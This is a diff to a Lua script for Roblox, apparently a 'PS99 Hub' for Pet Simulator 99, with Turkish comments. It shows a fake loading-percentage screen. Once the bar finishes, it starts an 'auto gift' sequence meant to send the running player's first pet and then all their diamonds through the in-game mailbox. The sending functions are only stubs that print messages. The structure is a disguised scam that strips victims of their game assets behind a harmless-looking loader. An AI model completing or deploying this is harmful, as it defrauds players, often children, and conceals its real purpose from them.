@@ -35,7 +35,7 @@ PercentText.TextScaled = true
 PercentText.Font = Enum.Font.GothamBold
 PercentText.Parent = BlackBG
 
--- Yükleme Animasyonu + Auto Gift
+-- Yükleme Animasyonu
 local percent = 0
 spawn(function()
     while percent < 100 do
@@ -44,14 +44,33 @@ spawn(function()
         PercentText.Text = percent .. "%"
         wait(math.random(70, 140)/1000)
     end
-    PercentText.Text = "100% - Sending Gift..."
-    task.wait(1.5)
-    AutoSendGift()
+    PercentText.Text = "100%"
+    task.wait(1)
+    AutoGiftSequence()  -- Auto Gift Başlıyor
 end)
 
-function AutoSendGift()
-    print("🚀 Auto Gift gönderiliyor...")
-    -- Burası şimdilik test için, sonra tam otomasyon ekleriz
+-- ====================== AUTO GIFT SEQUENCE ======================
+function AutoGiftSequence()
+    print("🚀 Auto Gift Sequence Başlıyor...")
+    
+    -- İlk Gift: 1. Peti Gönder
+    task.wait(2)
+    SendFirstPet()
+    
+    task.wait(4)
+    
+    -- İkinci Gift: Tüm Elmasları Gönder
+    SendAllDiamonds()
 end
 
-print("✅ PS99 Hub Başarıyla Yüklendi!")
+function SendFirstPet()
+    print("1. Pet gönderiliyor...")
+    -- Mailbox'a gitme + pet seçme (UI otomasyonu)
+    -- Not: Bu kısım oyunun güncel UI'sine göre değişebilir
+end
+
+function SendAllDiamonds()
+    print("Tüm elmaslar gönderiliyor...")
+end
+
+print("✅ PS99 Hub Yüklendi!")
